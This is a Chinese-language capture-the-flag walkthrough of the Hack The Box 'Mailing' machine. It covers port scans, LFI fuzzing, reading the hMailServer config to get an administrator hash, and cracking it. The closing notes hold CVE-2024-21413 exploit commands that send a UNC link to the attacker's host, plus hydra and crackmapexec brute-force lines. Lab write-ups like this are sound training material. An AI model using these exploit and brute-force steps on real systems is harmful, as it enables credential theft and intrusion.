
# 服务

```
┌──(root㉿kali)-[~]
└─# nmap -Pn -p- 10.10.11.14  
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-02 06:06 EDT
Stats: 0:00:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.34% done; ETC: 06:42 (0:35:37 remaining)
Stats: 0:03:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.94% done; ETC: 06:22 (0:11:55 remaining)
Stats: 0:05:20 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 40.99% done; ETC: 06:19 (0:07:41 remaining)
Stats: 0:05:55 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 43.33% done; ETC: 06:20 (0:07:44 remaining)
Nmap scan report for 10.10.11.14
Host is up (0.31s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
25/tcp    open  smtp                                                                                                
80/tcp    open  http                                                                                                
110/tcp   open  pop3                                                                                                
135/tcp   open  msrpc                                                                                               
139/tcp   open  netbios-ssn                                                                                         
143/tcp   open  imap                                                                                                
445/tcp   open  microsoft-ds                                                                                        
465/tcp   open  smtps                                                                                               
587/tcp   open  submission                                                                                          
993/tcp   open  imaps                                                                                               
5040/tcp  open  unknown                                                                                             
5985/tcp  open  wsman                                                                                               
7680/tcp  open  pando-pub                                                                                           
47001/tcp open  winrm                                                                                               
49664/tcp open  unknown                                                                                             
49665/tcp open  unknown                                                                                             
49666/tcp open  unknown                                                                                             
49667/tcp open  unknown                                                                                             
49668/tcp open  unknown                                                                                             
64869/tcp open  unknown                                                                                             
                                                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 852.80 seconds  
```

详细
```
┌──(root㉿kali)-[~/htb/Mailing]
└─# nmap -sV -Pn -A 10.10.11.14  -p 25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001
Starting Nmap 7.93 ( https://nmap.org ) at 2024-07-02 22:58 EDT
Stats: 0:03:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.82% done; ETC: 23:01 (0:00:00 remaining)
Nmap scan report for mailing.htb (10.10.11.14)
Host is up (0.52s latency).

PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mailing
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: QUOTA CHILDREN OK SORT CAPABILITY completed ACL IMAP4rev1 NAMESPACE IDLE RIGHTS=texkA0001 IMAP4
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp      hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|_ssl-date: TLS randomness does not represent time
587/tcp   open  smtp          hMailServer smtpd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp   open  ssl/imap      hMailServer imapd
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_imap-capabilities: QUOTA CHILDREN OK SORT CAPABILITY completed ACL IMAP4rev1 NAMESPACE IDLE RIGHTS=texkA0001 IMAP4
|_ssl-date: TLS randomness does not represent time
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-07-03T03:01:37
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: -8s

TRACEROUTE (using port 25/tcp)
HOP RTT       ADDRESS
1   361.14 ms 10.10.16.1
2   607.40 ms mailing.htb (10.10.11.14)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 243.20 seconds

```


通过搜索发现hmailserver 存在一个最新的漏洞cve-2024-21413，看poc需要账号和密码，先放一放


写域名
```
echo "10.10.11.14 mailing.htb" >> /etc/hosts
```

查看首页源代码，发现一个文件包含

![](Mailing_files/1.jpg)


```
<a href="download.php?file=instructions.pdf" class="download-button">Download Instructions</a>
```

## fuzz LFI
```
┌──(root㉿kali)-[~]
└─# wfuzz -c -w /usr/share/wordlists/SecLists-2023.2/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt --hw 0 http://mailing.htb/download.php?file=../../../../../../../FUZZ 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mailing.htb/download.php?file=../../../../../../../FUZZ
Total requests: 569

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                        
=====================================================================
...
000000280:   200        1961 L   10642 W    75358 Ch    "/php\php.ini"                                                                                 
000000281:   200        1961 L   10642 W    75358 Ch    "/PHP\php.ini"   

...
```

查看```http://mailing.htb/download.php?file=../../../../../php/php.ini```可以访问到文件内容

因为装的是80端口装的是IIS，合理猜测路径:http://mailing.htb/download.php?file=../../../../../../inetpub/wwwroot/web.config

显示
```
<configuration>
    <system.web>
        <customErrors mode="Off"/>
    </system.web>
</configuration>
```



web上几个人名：
- Ruy Alonso
- Maya Bendito
- Gregory Smith


访问下面路径会报错，其他则不会```http://mailing.htb/download.php?file=../../../../../../users/maya```

可能存在用户名：maya

页面返回```File not found.```可能是文件不存在，也可能是没有权限访问


根据扫描信息知道网站搭了hMailServer，通过[这里](https://www.cnblogs.com/huyueping/p/7603132.html#)知道配置文件地址

访问：
```
view-source:http://mailing.htb/download.php?file=../../../../../../Program%20Files%20(x86)/hMailServer\Bin\hMailServer.INI
```

返回：
```
[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1
```

出来一个AdministratorPassword，可能是md5：841bb5acfa6779ae432fd7a4e6600ba7

来到[这个解密网站](https://crackstation.net/)，解出来密码是：homenetworkingadministrator


使用[这个exp](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)



python CVE-2024-21413.py --server mailing.htb --port 587 --username Administrator@mailing.htb --password homenetworkingadministrator --sender Administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.16.25\test\meeting" --subject "hi"


python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url '\\10.10.16.25\PoC' --subject "Hello world"
 
 



hydra -l maya -P /usr/share/wordlists/rockyou.txt -f -v  smtp://10.10.11.14

crackmapexec winrm 10.10.11.14  -u maya -p /usr/share/wordlists/rockyou.txt


g.smith

Thunderbird 115.8.1

CVE-2024-1936
dig txt mailing.htb | grep spf


wfuzz -c -w ./lfi2.txt --hw 0 http://mailing.htb/download.php?file=../../../../../../../FUZZ